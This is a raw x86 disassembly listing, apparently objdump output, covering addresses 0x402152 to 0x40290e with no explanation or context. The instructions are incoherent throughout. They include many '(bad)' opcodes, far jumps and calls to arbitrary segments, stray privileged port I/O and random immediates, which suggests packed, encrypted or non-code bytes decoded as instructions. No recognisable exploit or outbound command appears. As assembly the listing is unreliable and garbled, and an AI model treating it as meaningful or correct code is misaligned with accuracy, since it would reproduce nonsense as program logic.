  402152:	dec    edi
  402153:	loope  0x4021be
  402155:	add    eax,0x8eb6216d
  40215a:	add    eax,0x71a3f9d6
  40215f:	ret    0x2628
  402162:	js     0x4021b3
  402164:	xor    bh,BYTE PTR [edi+0x5521624c]
  40216a:	int3   
  40216b:	xchg   edi,eax
  40216c:	stos   DWORD PTR es:[edi],eax
  40216d:	push   0x5e
  40216f:	repz shr BYTE PTR gs:[eax],0x18
  402174:	mov    dh,0x43
  402176:	dec    edi
  402177:	pusha  
  402178:	inc    esp
  402179:	mov    esi,0x934c1692
  40217e:	pop    ebp
  40217f:	xchg   ebx,eax
  402180:	fidiv  DWORD PTR [esi]
  402182:	push   esi
  402183:	add    eax,0x1e1d1d24
  402188:	mov    al,ds:0x5b8b6910
  40218d:	cdq    
  40218e:	inc    ebp
  40218f:	cwde   
  402190:	dec    ecx
  402191:	clc    
  402192:	aaa    
  402193:	dec    edi
  402194:	out    dx,eax
  402195:	arpl   WORD PTR [ecx-0x17],cx
  402198:	jmp    0x2751:0xc1482b44
  40219f:	xor    BYTE PTR [eax+0x37],dl
  4021a2:	pop    edx
  4021a3:	mov    BYTE PTR [esi],0x4b
  4021a6:	mov    BYTE PTR [ebx],dl
  4021a8:	ret    
  4021a9:	loope  0x4021e5
  4021ab:	mov    ch,0xbf
  4021ad:	ucomiss xmm3,DWORD PTR [ebx-0xc6ee9e]
  4021b4:	cs pop esp
  4021b6:	into   
  4021b7:	in     eax,0xc3
  4021b9:	ins    BYTE PTR es:[edi],dx
  4021ba:	mov    al,ds:0x63ae7312
  4021bf:	mov    dh,0x68
  4021c2:	or     eax,0x3408e0e8
  4021c7:	or     al,BYTE PTR [edx]
  4021c9:	mov    dh,BYTE PTR ds:[eax+eiz*8]
  4021cd:	lock push es
  4021cf:	mov    ch,0x6c
  4021d1:	addr16 add al,0x51
  4021d4:	xchg   esp,eax
  4021d5:	cmc    
  4021d6:	dec    esi
  4021d7:	push   esp
  4021d8:	push   ss
  4021d9:	mov    edx,0x4a6074bc
  4021de:	adc    DWORD PTR [eax],ebp
  4021e0:	popf   
  4021e1:	cli    
  4021e2:	xchg   edx,eax
  4021e3:	mov    bh,0x1f
  4021e5:	ja     0x4021fb
  4021e7:	mov    ah,0xdb
  4021e9:	dec    edi
  4021ea:	or     bl,dl
  4021ec:	jb     0x40219f
  4021ee:	ficom  DWORD PTR [ebx+0x1e]
  4021f1:	ds inc ebx
  4021f3:	sub    al,0x8b
  4021f5:	xchg   esi,eax
  4021f6:	or     al,0xdc
  4021f8:	(bad)  
  4021f9:	rol    DWORD PTR [eax+0x6fd3aa9],1
  4021ff:	(bad)  [eax]
  402201:	adc    ecx,DWORD PTR [eax-0x36]
  402204:	mov    ds:0x2695f08d,al
  402209:	loope  0x4021f7
  40220b:	fist   DWORD PTR [ecx]
  40220d:	pop    ds
  40220e:	ror    ebp,1
  402210:	pop    ecx
  402211:	inc    esi
  402212:	mov    edi,DWORD PTR [edx-0x294a0d39]
  402218:	mov    dl,0xf7
  40221a:	test   BYTE PTR [ecx+0x2d5ec499],cl
  402220:	pushf  
  402221:	bound  ebp,QWORD PTR [ebx-0x10e8096e]
  402227:	ins    BYTE PTR es:[edi],dx
  402228:	inc    edi
  402229:	pushf  
  40222a:	in     eax,0x42
  40222c:	cmc    
  40222d:	sar    BYTE PTR [edx+edx*1-0x3],0x46
  402232:	pop    esp
  402233:	add    al,0xca
  402235:	jg     0x4022b2
  402237:	pop    esp
  402238:	or     al,0xc9
  40223a:	repnz addr16 ds and eax,edi
  40223f:	std    
  402240:	lock fiadd DWORD PTR [ecx]
  402243:	retf   
  402244:	mov    al,ds:0x57f0c20c
  402249:	adc    eax,0x83d7f44c
  40224e:	pop    esp
  40224f:	pop    ds
  402250:	push   ebp
  402251:	(bad)  
  402253:	push   DWORD PTR [eax]
  402255:	out    0x28,eax
  402257:	lock adc BYTE PTR es:[ecx-0x6b],0xee
  40225d:	mov    bl,0x39
  40225f:	std    
  402260:	aas    
  402261:	or     esi,DWORD PTR [esi+0x62]
  402264:	fistp  DWORD PTR [ecx+edi*2+0x65]
  402268:	pop    ebx
  402269:	repnz test al,0x69
  40226c:	jmp    0x402295
  40226e:	gs addr16 mov cl,0xf7
  402272:	pusha  
  402273:	nop
  402274:	sub    edx,esi
  402276:	stos   BYTE PTR es:[edi],al
  402277:	and    BYTE PTR [edx-0x1f4f1629],bl
  40227d:	je     0x402225
  40227f:	les    eax,FWORD PTR [esi]
  402281:	out    dx,eax
  402282:	stos   BYTE PTR es:[edi],al
  402283:	and    al,0xcd
  402285:	pop    es
  402286:	mov    ch,0xb3
  402288:	cmc    
  402289:	loope  0x4022c8
  40228b:	jmp    0x40f2e27f
  402290:	push   esi
  402291:	mov    DWORD PTR [ebx],edi
  402293:	sbb    DWORD PTR [eax+0x29277de2],edi
  402299:	(bad)  
  40229a:	std    
  40229b:	dec    ebp
  40229c:	xchg   ebx,eax
  40229d:	inc    ebx
  40229e:	sub    cl,ch
  4022a0:	mov    ds:0x5845b3a6,eax
  4022a5:	push   ss
  4022a6:	pop    esp
  4022a7:	xchg   BYTE PTR [edi-0x60],dh
  4022aa:	leave  
  4022ab:	pop    esp
  4022ac:	add    DWORD PTR [ebx-0x55],esi
  4022af:	div    al
  4022b1:	call   0x2ca7:0x7650607a
  4022b8:	lock aam 0xee
  4022bb:	mov    BYTE PTR [edx+edx*4+0x4cf8b197],dh
  4022c2:	sub    edx,esp
  4022c4:	repnz fld QWORD PTR [ebx+eax*4+0x43]
  4022c9:	and    BYTE PTR [eax+ecx*4],bh
  4022cc:	mov    ah,0xdd
  4022ce:	or     bh,BYTE PTR [ecx+0x66]
  4022d1:	cmp    eax,0x76058995
  4022d6:	test   al,0xc4
  4022d8:	popa   
  4022d9:	cmp    al,0xb3
  4022db:	addr16 cs inc ebx
  4022de:	fwait
  4022df:	retf   
  4022e0:	(bad)  
  4022e1:	outs   dx,BYTE PTR ds:[esi]
  4022e2:	inc    edi
  4022e3:	iret   
  4022e4:	inc    eax
  4022e5:	in     al,dx
  4022e6:	pop    DWORD PTR [eax-0x308acf3c]
  4022ec:	jbe    0x40231f
  4022ee:	cmp    ecx,edx
  4022f0:	aam    0xfa
  4022f2:	jmp    0x40229c
  4022f4:	gs in  al,dx
  4022f6:	xor    eax,0xfff649d6
  4022fb:	jge    0x4022b8
  4022fd:	cmp    eax,0x33d48088
  402302:	jo     0x40236e
  402304:	div    BYTE PTR [esi+0x19]
  402307:	nop
  402308:	inc    ebx
  402309:	fcomi  st,st(4)
  40230b:	inc    ebx
  40230c:	(bad)  
  40230e:	xchg   esp,eax
  40230f:	fstp   TBYTE PTR [eax-0x32]
  402312:	aam    0x6a
  402314:	or     DWORD PTR [eax-0x68a05898],0x8f5fb411
  40231e:	frstor ds:0xf756391c
  402324:	test   al,0xe3
  402326:	pop    esi
  402327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402328:	xlat   BYTE PTR ds:[ebx]
  402329:	test   DWORD PTR [edx-0x2400309e],edi
  40232f:	dec    ebp
  402330:	lds    edi,FWORD PTR [ebx]
  402332:	popa   
  402333:	pop    ss
  402334:	(bad)  
  402336:	ror    BYTE PTR [ebx-0x6cd1d9b8],0xb7
  40233d:	cwde   
  40233e:	cs ins BYTE PTR es:[edi],dx
  402340:	and    bh,BYTE PTR [edi]
  402342:	inc    edx
  402343:	pop    di
  402345:	fwait
  402346:	int    0x3d
  402348:	clc    
  402349:	inc    BYTE PTR [edx-0x3a06b10b]
  40234f:	pop    edx
  402350:	shl    DWORD PTR [esi-0x18],0x73
  402354:	repz aas 
  402356:	inc    eax
  402357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402358:	inc    ecx
  402359:	not    BYTE PTR [ebx]
  40235b:	sbb    al,0x57
  40235d:	outs   dx,BYTE PTR ds:[esi]
  40235e:	cs (bad) 
  402360:	ins    BYTE PTR es:[edi],dx
  402361:	inc    eax
  402362:	inc    ebx
  402363:	(bad)
  402366:	sti    
  402367:	out    dx,eax
  402368:	sub    ch,BYTE PTR [esi+edx*2+0x5d]
  40236c:	sbb    eax,0x8643485f
  402371:	sub    ebp,DWORD PTR [esi]
  402373:	daa    
  402374:	add    dl,BYTE PTR [esi-0x166a572c]
  40237a:	call   0x38d9181d
  40237f:	in     eax,0x75
  402381:	cmp    eax,DWORD PTR [edx+0x56]
  402384:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402385:	pop    ebp
  402386:	sti    
  402387:	inc    edx
  402388:	or     eax,0x613323ba
  40238d:	lea    eax,es:[ebx+ebp*2+0x203463d9]
  402395:	xchg   ecx,eax
  402396:	mov    eax,ds:0x9193355f
  40239b:	out    0xfd,eax
  40239d:	xchg   edx,eax
  40239e:	sub    al,0xc7
  4023a0:	mov    ch,0xbc
  4023a2:	pop    ss
  4023a3:	dec    ecx
  4023a4:	cmp    DWORD PTR [edi-0x71],ecx
  4023a7:	cld    
  4023a8:	es jo  0x4023fd
  4023ab:	xchg   DWORD PTR [ecx],edi
  4023ad:	sti    
  4023ae:	cmc    
  4023af:	(bad)  
  4023b0:	sbb    edi,DWORD PTR [edx+edi*8-0x68]
  4023b4:	jns    0x402382
  4023b6:	sbb    dh,BYTE PTR [ebp+0x72a02186]
  4023bc:	mov    al,0x8a
  4023be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023bf:	retf   0x9213
  4023c2:	not    DWORD PTR [edi]
  4023c4:	dec    ebx
  4023c5:	push   edx
  4023c6:	scas   eax,DWORD PTR es:[edi]
  4023c7:	pop    edi
  4023c8:	cmp    bh,dh
  4023ca:	pop    ebp
  4023cb:	mov    fs,WORD PTR [ebp+0x64db0907]
  4023d1:	pusha  
  4023d2:	and    DWORD PTR [esi],ecx
  4023d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023d5:	imul   edx,eax,0x38787cad
  4023db:	mov    DWORD PTR [ecx+0x13783c11],ebx
  4023e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023e2:	aas    
  4023e3:	mov    ebx,DWORD PTR [ebp-0x1f]
  4023e6:	push   ebp
  4023e7:	inc    ecx
  4023e8:	int3   
  4023e9:	in     al,dx
  4023ea:	mov    dl,0xf
  4023ec:	dec    eax
  4023ed:	gs imul eax,DWORD PTR cs:[esi+0x12ecbb97],0x4a
  4023f6:	pop    ds
  4023f7:	(bad)  
  4023f8:	cld    
  4023f9:	out    0x7d,eax
  4023fb:	xor    eax,0x5bf82fa9
  402400:	cmp    DWORD PTR [ecx+ebx*2-0x701bfdec],ebp
  402407:	aaa    
  402408:	test   al,0x6b
  40240a:	xor    al,0x5
  40240c:	ins    BYTE PTR es:[edi],dx
  40240d:	adc    BYTE PTR [edi],bl
  40240f:	into   
  402410:	pop    eax
  402411:	mov    bh,0xeb
  402413:	loop   0x40246f
  402415:	lea    esi,[edx]
  402417:	imul   ebx,DWORD PTR [edx],0x2b
  40241a:	and    esi,ebx
  40241c:	push   es
  40241d:	pop    es
  40241e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40241f:	pop    eax
  402420:	push   es
  402421:	jno    0x4023e1
  402423:	out    dx,eax
  402424:	into   
  402425:	mov    ebx,0x3eaf39d
  40242a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40242b:	pop    ebx
  40242c:	pushf  
  40242d:	test   BYTE PTR ds:0x6b601a44,bh
  402433:	adc    bl,bl
  402435:	xchg   DWORD PTR [ecx-0x7ebf0a4d],ebx
  40243b:	outs   dx,DWORD PTR ds:[si]
  40243d:	mov    al,BYTE PTR [ebp-0x3e]
  402440:	push   eax
  402441:	push   edi
  402442:	jnp    0x4024a7
  402444:	push   eax
  402445:	dec    esi
  402446:	dec    esp
  402447:	fstp   DWORD PTR [edx+0x5e11afe1]
  40244d:	dec    edx
  40244e:	pusha  
  40244f:	mov    esp,0xdf91306
  402454:	sub    dl,BYTE PTR [ebp-0x773f2c02]
  40245a:	sti    
  40245b:	clc    
  40245c:	add    esi,DWORD PTR [edx-0x1f]
  40245f:	aam    0x3a
  402461:	sbb    DWORD PTR [eax],edx
  402463:	jge    0x402498
  402465:	mov    esi,0x81fac18
  40246a:	iret   
  40246b:	push   ds
  40246c:	mov    dl,dl
  40246e:	add    dl,bh
  402470:	(bad)  
  402471:	xor    al,0x4b
  402473:	gs loope 0x4024bd
  402476:	inc    eax
  402477:	adc    eax,0xefcf4dcc
  40247c:	jle    0x402468
  40247e:	or     al,0xef
  402480:	mov    WORD PTR [edi+0x1b],?
  402483:	mov    dh,0x16
  402485:	test   BYTE PTR [edi+ebx*8+0x3a],dh
  402489:	mov    ebx,0xb86aded4
  40248e:	pop    esp
  40248f:	pop    esp
  402490:	sbb    al,BYTE PTR [ebp+0x4d9de6ef]
  402496:	mov    ch,0xdf
  402498:	or     esi,edx
  40249a:	stos   DWORD PTR es:[edi],eax
  40249b:	loop   0x4024f6
  40249d:	xchg   edi,eax
  40249e:	sbb    BYTE PTR [ebp+0x7b],dl
  4024a1:	int    0xae
  4024a3:	sub    eax,0x39ac907c
  4024a8:	mov    ecx,ecx
  4024aa:	imul   edx,DWORD PTR [ebp+edx*8-0x31b31c78],0x92b37d63
  4024b5:	rol    BYTE PTR [ebp-0x30],cl
  4024b8:	mov    dl,0xd6
  4024ba:	in     al,0x20
  4024bc:	arpl   WORD PTR [edi-0x78],sp
  4024bf:	pop    eax
  4024c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024c1:	push   ecx
  4024c2:	int    0x24
  4024c4:	mov    ah,0x69
  4024c6:	mov    ch,0x49
  4024c8:	lea    esi,[esi+ecx*8]
  4024cb:	fst    DWORD PTR [esi-0x27]
  4024ce:	sub    ebx,DWORD PTR [edi-0x5d]
  4024d1:	pop    eax
  4024d2:	inc    ecx
  4024d3:	cs test eax,0xfce56e2c
  4024d9:	sbb    al,0xae
  4024db:	fist   WORD PTR [ecx-0x32dd48c5]
  4024e1:	mov    eax,0x45075600
  4024e6:	mov    esi,0xd2b6789
  4024eb:	outs   dx,BYTE PTR ds:[esi]
  4024ec:	out    dx,al
  4024ed:	pushf  
  4024ee:	cmp    edx,DWORD PTR [edi+0x2ed5c7f9]
  4024f4:	call   0x1039098c
  4024f9:	xor    ch,bl
  4024fb:	dec    edx
  4024fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024fd:	jns    0x40249d
  4024ff:	nop
  402500:	dec    ebp
  402501:	mov    ecx,0x5ed3d79b
  402506:	mov    eax,DWORD PTR [ebp-0x6638dbdf]
  40250c:	out    dx,eax
  40250d:	mov    ds:0xbe3f8c82,al
  402512:	retf   0x946
  402515:	icebp  
  402516:	mov    dh,0x92
  402518:	lahf   
  402519:	and    bh,bh
  40251b:	add    BYTE PTR [ecx+0x34],ah
  40251e:	or     BYTE PTR [ecx+0x5f036696],0x5b
  402525:	pop    edi
  402526:	mov    al,ds:0xcafa85cd
  40252b:	ret    0x8c39
  40252e:	inc    edi
  40252f:	mov    cl,0x3e
  402531:	int    0xdf
  402533:	mov    ds:0x2de816de,eax
  402538:	pop    edx
  402539:	mov    ds:0x7323f8e1,al
  40253e:	hlt    
  40253f:	rol    BYTE PTR [ebx-0x3f],1
  402542:	mov    ah,0xa8
  402544:	shr    DWORD PTR [esi-0x57],cl
  402547:	adc    BYTE PTR [eax-0x32],al
  40254a:	fild   DWORD PTR [edx+ebp*1]
  40254d:	(bad)  
  40254e:	or     al,ah
  402550:	retf   0x508b
  402553:	mov    ebx,0xf611d7c3
  402558:	add    DWORD PTR [esp+ecx*2],ecx
  40255b:	jbe    0x402589
  40255d:	push   ecx
  40255e:	mov    eax,0x9ca7bc0f
  402563:	lods   al,BYTE PTR ds:[esi]
  402564:	jns    0x4024ff
  402566:	mov    dl,bh
  402568:	in     al,0x15
  40256a:	gs ret 
  40256c:	jns    0x40255e
  40256e:	lea    edx,[ebx+0x4d92c40b]
  402574:	in     al,dx
  402575:	push   ss
  402576:	aas    
  402577:	or     al,0x27
  402579:	pusha  
  40257a:	loopne 0x4025ab
  40257c:	hlt    
  40257d:	and    al,0xaf
  40257f:	mov    ebp,0xb0f881a3
  402584:	cli    
  402585:	cmp    BYTE PTR [eax],bh
  402587:	popa   
  402588:	pushf  
  402589:	fwait
  40258a:	shl    ecx,cl
  40258c:	xlat   BYTE PTR ds:[ebx]
  40258d:	jo     0x40253a
  40258f:	das    
  402590:	sub    ebx,DWORD PTR [edi+0x61]
  402593:	lea    esp,[esi]
  402595:	sub    al,0x68
  402597:	sbb    ebp,ebx
  402599:	adc    eax,0x4a552e09
  40259e:	sti    
  40259f:	add    al,0xbc
  4025a1:	mov    al,0xe2
  4025a3:	add    BYTE PTR [edx+0x4],0xf8
  4025a7:	outs   dx,DWORD PTR ds:[esi]
  4025a8:	mov    DWORD PTR [eax+ecx*1+0x1868a135],edx
  4025af:	in     eax,dx
  4025b0:	outs   dx,DWORD PTR ds:[esi]
  4025b1:	jmp    0x316d:0x78d0e3cb
  4025b8:	inc    ebp
  4025b9:	inc    edi
  4025ba:	push   ss
  4025bb:	xor    ecx,DWORD PTR [bp+di-0x2006]
  4025c0:	out    0x84,eax
  4025c2:	or     al,0x99
  4025c4:	pusha  
  4025c5:	push   edi
  4025c6:	pop    edi
  4025c7:	lds    edi,FWORD PTR [ecx]
  4025c9:	sub    eax,0x6026166c
  4025ce:	pop    ebp
  4025cf:	in     al,0xca
  4025d1:	sahf   
  4025d2:	lahf   
  4025d3:	ficomp WORD PTR [ecx+0x6f]
  4025d6:	out    dx,al
  4025d7:	jmp    0xe813622b
  4025dc:	xchg   BYTE PTR [ebp-0x16],dl
  4025df:	cmp    edi,DWORD PTR [edi-0x2c]
  4025e2:	inc    ebx
  4025e3:	or     esi,DWORD PTR [esi-0x4e4d1318]
  4025e9:	or     ch,bl
  4025eb:	inc    ebp
  4025ec:	int3   
  4025ed:	xchg   ecx,eax
  4025ee:	xchg   esp,eax
  4025ef:	and    DWORD PTR [edx+0x54729a9d],edi
  4025f5:	and    BYTE PTR [eax+0x34],ch
  4025f8:	add    al,0xfc
  4025fa:	mov    ah,0x62
  4025fc:	fiadd  WORD PTR [ebp-0x4f4c2a56]
  402602:	jnp    0x402624
  402604:	mov    ch,BYTE PTR ds:0x7f40d304
  40260a:	mov    BYTE PTR [ecx-0x2997334c],cl
  402610:	pop    esp
  402611:	pop    edi
  402612:	jnp    0x4025fe
  402614:	inc    ecx
  402615:	shl    BYTE PTR [edx],cl
  402617:	outs   dx,DWORD PTR ds:[esi]
  402618:	pop    esi
  402619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40261a:	int3   
  40261b:	repnz pop eax
  40261d:	cmp    al,0xc6
  40261f:	cdq    
  402620:	mov    ch,0x66
  402622:	ficom  DWORD PTR [ebp+0x62bcd207]
  402628:	inc    eax
  402629:	mov    BYTE PTR [ebx],dl
  40262b:	mov    ds:0x5108dfab,al
  402630:	int3   
  402631:	les    esp,FWORD PTR [ebx]
  402633:	fwait
  402634:	xor    edx,esp
  402636:	push   es
  402637:	ds pushf 
  402639:	pusha  
  40263a:	enter  0xc35a,0xc
  40263e:	fbstp  TBYTE PTR fs:[ecx-0x68a498ca]
  402645:	xor    dh,BYTE PTR [edi+0x10fbe7f0]
  40264b:	or     ebx,esp
  40264d:	jae    0x402646
  40264f:	popf   
  402650:	sbb    cl,BYTE PTR [esi-0x57]
  402653:	or     cl,bh
  402655:	inc    ebp
  402656:	rol    BYTE PTR [ecx+0x7dd1d6],1
  40265c:	outs   dx,DWORD PTR ds:[esi]
  40265d:	(bad)  
  40265e:	data16 mov cl,0x4
  402661:	ds pusha 
  402663:	cwde   
  402664:	cdq    
  402665:	mov    al,0x4
  402667:	test   BYTE PTR [ebx-0x36c9b5f4],bh
  40266d:	lods   eax,DWORD PTR ds:[esi]
  40266e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40266f:	rol    DWORD PTR [ebp+edi*4+0x17],cl
  402673:	xor    bh,dl
  402675:	and    DWORD PTR [ebp-0x73],edi
  402678:	(bad)  
  402679:	call   0xa7a:0xb24f7c98
  402680:	pusha  
  402681:	int    0xfd
  402683:	push   ds
  402684:	add    esp,DWORD PTR [ecx-0x39ac00eb]
  40268a:	jp     0x402616
  40268c:	pop    ebp
  40268d:	stc    
  40268e:	mov    dh,0x69
  402690:	mov    edx,0x3b1881a8
  402695:	push   cs
  402696:	int    0xbf
  402698:	addr16 mov ah,0x5e
  40269b:	jmp    0x402710
  40269d:	popf   
  40269e:	pand   mm1,mm7
  4026a1:	xor    al,0xec
  4026a3:	push   ss
  4026a4:	sbb    esi,edx
  4026a6:	dec    eax
  4026a7:	jg     0x402662
  4026a9:	pop    ebp
  4026aa:	out    0x9f,al
  4026ac:	mov    esi,0xabd3bf02
  4026b1:	pushf  
  4026b2:	jnp    0x4026d6
  4026b4:	out    dx,eax
  4026b5:	push   esi
  4026b6:	or     edi,edx
  4026b8:	loop   0x4026d3
  4026ba:	out    0xd5,eax
  4026bc:	or     edi,DWORD PTR [edx+0x117b8624]
  4026c2:	mov    ch,0x23
  4026c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026c5:	dec    ecx
  4026c6:	les    ebp,FWORD PTR gs:[edi+0x39f4dc7e]
  4026cd:	xchg   edx,eax
  4026ce:	cmp    eax,0x30afa522
  4026d3:	add    bh,cl
  4026d5:	lds    esi,FWORD PTR [edx-0x68]
  4026d8:	stos   BYTE PTR es:[edi],al
  4026d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026da:	lods   eax,DWORD PTR ds:[esi]
  4026db:	sub    BYTE PTR [esi-0x49],ah
  4026de:	ss into 
  4026e0:	add    edi,esp
  4026e2:	popa   
  4026e3:	adc    dh,al
  4026e5:	jle    0x402688
  4026e7:	adc    ch,BYTE PTR [esi-0x64]
  4026ea:	sub    eax,DWORD PTR [eax]
  4026ec:	inc    esi
  4026ed:	and    ecx,DWORD PTR [edi]
  4026ef:	sub    edx,DWORD PTR [esi+0x123f3d87]
  4026f5:	cmp    esi,DWORD PTR [edx]
  4026f7:	xchg   edx,eax
  4026f8:	fild   QWORD PTR [esi+0x6c10c5e0]
  4026fe:	ja     0x402689
  402700:	and    edx,DWORD PTR [esi+edx*1]
  402703:	cmc    
  402704:	xchg   edx,eax
  402705:	mov    ss,WORD PTR ds:0xdd6308c7
  40270b:	pop    ebp
  40270c:	xor    al,0x96
  40270e:	(bad)
  402713:	dec    esp
  402714:	xchg   BYTE PTR [edi+0x49d210c9],ah
  40271a:	out    dx,eax
  40271b:	out    0xfd,eax
  40271d:	mov    dh,0x1b
  40271f:	es and al,0xb4
  402722:	iret   
  402723:	mov    ds,WORD PTR [eax-0x5a07bbc0]
  402729:	stos   BYTE PTR es:[edi],al
  40272a:	inc    ecx
  40272b:	out    0x1c,al
  40272d:	adc    BYTE PTR [ebx],dl
  40272f:	xor    DWORD PTR [edi+0x6b02e57],esi
  402735:	push   es
  402736:	push   edi
  402737:	pop    DWORD PTR [edx+0x2d]
  40273a:	(bad)  
  40273b:	sbb    al,0xa
  40273d:	inc    edx
  40273e:	mov    ah,0x6b
  402740:	inc    edx
  402741:	sub    BYTE PTR [edx],ah
  402743:	inc    ebp
  402744:	ins    BYTE PTR es:[edi],dx
  402745:	mov    ebp,0xe111a19c
  40274a:	gs lock mov cl,0xd8
  40274e:	cli    
  40274f:	mov    esi,0xf5d18ffb
  402754:	mov    eax,ebp
  402756:	add    BYTE PTR [eax-0x1852e01a],cl
  40275c:	lods   eax,DWORD PTR ds:[esi]
  40275d:	out    0xa8,al
  40275f:	add    eax,0x690199ae
  402764:	les    ebp,FWORD PTR [eax-0x3d]
  402767:	inc    esi
  402768:	dec    edx
  402769:	fwait
  40276a:	scas   al,BYTE PTR es:[edi]
  40276b:	dec    edi
  40276c:	lahf   
  40276d:	mov    ?,edi
  40276f:	sbb    eax,0x2ad05d31
  402774:	cmc    
  402775:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402776:	or     cl,BYTE PTR [ecx]
  402778:	jmp    0xe612:0x1936b3f6
  40277f:	and    DWORD PTR [eax+0x38],ecx
  402782:	call   0xdd413e96
  402787:	adc    dh,BYTE PTR [eax+0x6a]
  40278a:	mov    bh,BYTE PTR [edx]
  40278c:	mov    eax,0x6d28a29b
  402791:	push   esi
  402792:	mov    ds:0xd829b59,eax
  402797:	jns    0x4027b8
  402799:	outs   dx,DWORD PTR ds:[esi]
  40279a:	jle    0x4027f7
  40279c:	cmp    DWORD PTR [ecx-0x35e19b9c],0x8b37232c
  4027a6:	jns    0x40276b
  4027a8:	stos   BYTE PTR es:[edi],al
  4027a9:	mov    edx,0x7977e590
  4027ae:	xchg   ebx,eax
  4027af:	jp     0x402780
  4027b1:	cmp    esi,DWORD PTR [ebx+ebx*1]
  4027b4:	xor    bh,BYTE PTR [eax-0x44]
  4027b7:	outs   dx,DWORD PTR ds:[esi]
  4027b8:	retf   0xb1c5
  4027bb:	shl    esp,1
  4027bd:	mov    ds:0x14d018de,al
  4027c2:	pushf  
  4027c3:	mov    bl,0x87
  4027c5:	mov    ecx,0xf431d2da
  4027ca:	adc    ch,BYTE PTR [edi+eiz*8+0x39be9202]
  4027d1:	mov    eax,0x31272cbd
  4027d6:	mov    dl,0xb1
  4027d8:	push   ebp
  4027d9:	mov    ds:0x7c8d7b6d,al
  4027de:	loop   0x402792
  4027e0:	cmp    eax,0xe42dcf39
  4027e5:	retf   0x3439
  4027e8:	test   DWORD PTR [ebp+eax*1-0x4f],edx
  4027ec:	mov    esi,0x23541c6b
  4027f1:	cmc    
  4027f2:	add    al,0x21
  4027f4:	stos   DWORD PTR es:[edi],eax
  4027f5:	xchg   edx,eax
  4027f6:	xchg   DWORD PTR [ebx+0x1a],ebx
  4027f9:	push   ss
  4027fa:	pop    ds
  4027fb:	jb     0x402831
  4027fd:	cdq    
  4027fe:	std    
  4027ff:	ins    BYTE PTR es:[edi],dx
  402800:	jb     0x40287c
  402802:	gs cmp eax,0x1dd3ca5b
  402808:	ja     0x4027b6
  40280a:	sbb    dl,BYTE PTR [ecx+0x6e]
  40280d:	frstor [edi+eax*8+0x73297591]
  402814:	pop    es
  402815:	sbb    ah,BYTE PTR [edx-0x47af60ab]
  40281b:	ficomp DWORD PTR [edx]
  40281d:	cmp    eax,DWORD PTR [eax]
  40281f:	and    DWORD PTR [edi],0xffffffb4
  402822:	cdq    
  402823:	cld    
  402824:	test   DWORD PTR [edi+0x6c],esp
  402827:	add    eax,0x3530d644
  40282c:	dec    ecx
  40282d:	mov    ch,0x5d
  40282f:	pushf  
  402830:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402831:	nop
  402832:	sbb    ecx,eax
  402834:	stos   DWORD PTR es:[edi],eax
  402835:	push   ds
  402836:	stos   BYTE PTR es:[edi],al
  402837:	cs push 0x504e7000
  40283d:	and    al,0xa5
  40283f:	jmp    0x402838
  402841:	mov    esi,0x75577a4f
  402846:	enter  0xda9c,0x51
  40284a:	mov    ds:0x5cb0102f,al
  40284f:	in     eax,dx
  402850:	xchg   edi,eax
  402851:	repnz addr16 inc esi
  402854:	cld    
  402855:	ret    0x99a5
  402858:	inc    ebx
  402859:	js     0x4027fd
  40285b:	sbb    al,al
  40285d:	sub    eax,0x2a45ffed
  402862:	jnp    0x4028d2
  402864:	fld    DWORD PTR [ecx-0x1a7b49f0]
  40286a:	xchg   edx,eax
  40286b:	jne    0x4027ed
  40286d:	or     al,0xe8
  40286f:	stos   BYTE PTR es:[edi],al
  402870:	xor    esp,ecx
  402872:	mov    BYTE PTR [esi-0x5d98ce2d],dl
  402878:	jl     0x402880
  40287a:	jnp    0x4028e3
  40287c:	jle    0x402826
  40287e:	nop
  40287f:	mov    dl,BYTE PTR [ebp+ecx*1+0x24b1b474]
  402886:	imul   ebx,DWORD PTR [esp+ebp*4-0x34aac4e4],0x35
  40288e:	rcl    BYTE PTR [edx],1
  402890:	int3   
  402891:	(bad)  
  402892:	jmp    0x23ad:0x9c3ff1c6
  402899:	mov    bl,0x83
  40289b:	xor    al,BYTE PTR [ecx+0x35]
  40289e:	jge    0x40288d
  4028a0:	push   0xdb01aade
  4028a5:	adc    al,0xe7
  4028a7:	jle    0x4028dd
  4028a9:	clc    
  4028aa:	xor    eax,0x9949c004
  4028af:	sbb    DWORD PTR [ecx-0x24],ebx
  4028b2:	jge    0x4028d0
  4028b4:	and    BYTE PTR [ebx],0xe
  4028b7:	xchg   BYTE PTR [esi+0x41be1213],ah
  4028bd:	sub    eax,0x196d8762
  4028c2:	fisttp DWORD PTR [esi]
  4028c4:	loopne 0x4028d1
  4028c6:	sub    DWORD PTR es:[eax],eax
  4028c9:	lods   al,BYTE PTR ds:[esi]
  4028ca:	jmp    0x4028bf
  4028cc:	jno    0x4028e8
  4028ce:	jbe    0x40285b
  4028d0:	mov    edx,0x959304b7
  4028d5:	sub    dl,BYTE PTR [eax+0x8]
  4028d8:	mov    eax,DWORD PTR ds:0x4196507
  4028de:	push   0x50
  4028e0:	mov    esi,0x4690fe05
  4028e5:	mov    eax,0x9fe00ac2
  4028ea:	fsubr  DWORD PTR [edx-0x577b7794]
  4028f0:	stc    
  4028f1:	pop    ebx
  4028f2:	out    0x15,al
  4028f4:	jecxz  0x402920
  4028f6:	or     ebx,0x4c1443e
  4028fc:	adc    BYTE PTR ds:[eax+0x12],dh
  402900:	push   0xffffff91
  402902:	mov    ebx,0xfb156498
  402907:	cmp    eax,0xb1c17022
  40290c:	jmp    ebp
  40290e:	cmp    al,0xb7
